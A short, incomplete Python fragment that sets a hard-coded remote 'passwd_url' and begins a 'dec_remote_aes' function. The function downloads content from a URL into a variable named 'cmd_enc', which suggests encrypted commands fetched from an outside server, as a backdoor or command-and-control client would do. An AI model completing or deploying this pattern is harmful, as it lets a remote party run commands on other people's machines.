import requests

passwd_url = 'http://ss.getworld.in/'

def dec_remote_aes(enc_cmd_url):
    r = requests.get(enc_cmd_url)
    cmd_enc = r.content
